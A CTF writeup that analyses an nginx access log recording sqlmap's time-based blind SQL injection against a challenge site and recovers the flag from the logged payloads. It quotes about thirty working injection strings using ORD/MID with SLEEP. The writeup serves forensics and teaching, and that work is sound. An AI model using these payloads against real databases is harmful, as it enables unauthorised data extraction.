Title: CTF writeup - RCTF 2015 Quals: Analysis nginx's log
Category: Infosec
Tags: ctf,sqli
Modified: 2015-11-29
Summary: Analysis of a blind SQL Injection in logs


## Challenge

> Analysis nginx's log (this flag is like ROIS{xxx}).

The log file can be found [here](https://github.com/ctfs/write-ups-2015/blob/master/rctf-quals-2015/misc/analysis-nginxs-log/log_d30afe96202aafae7c0a1ecc123c0584).

## Writeup

The first thing I did is to search for the string `flag`, which found a [blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection) performed by [sqlmap](http://sqlmap.org/).
I extracted those URL-encoded entries then converted them to readable text using [asciitohex](http://www.asciitohex.com), which gave lines like these:

```text hl_lines="8 16 24 32"
192.168.52.1 - - [06/Nov/2015:19:33:07 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>64),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:07 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>96),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:08 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>80),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:08 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>88),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:08 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>84),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:08 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>82),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>81),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))!=82),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:10 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>64),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:10 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>96),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:10 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>80),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:11 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>72),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:12 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>76),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:13 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>78),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:13 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>79),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:13 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))!=79),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:14 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>64),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:14 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>96),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:14 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>80),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>72),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>76),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>74),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>73),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))!=73),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:16 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>64),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:16 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>96),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:17 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>80),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:17 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>88),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:17 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>84),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:18 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>82),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:18 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>83),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:18 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))!=83),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
```

For each character of the flag, there is a bunch of entries that basically does this:

```python
if flag[0].char_code > 64:
    sleep(1)
```

Then, after multiple guesses, sqlmap confirms the exact character code:

```python
if flag[0].char_code != 82:
    sleep(1)
```

Then it goes to the next character: `LIMIT 0,1),1,1` becomes `LIMIT 0,1),2,1`.

So the most interesting entries contains a `!=`, like this: `...LIMIT 0,1),1,1))!=82),SLEEP(1)...` (highlighted in the snippet).
We can find the flag value by extracting every character code after a `!=`. I used Sublime Text's search + multi-select for this, but you can do some vim or regex magic too.
Pasting these characters in [asciitohex](http://www.asciitohex.com) revealed the flag.
In the snippet above, you can find the first 4 characters.

Flag: `ROIS{miSc_An@lySis_nG1nx_L0g}`.
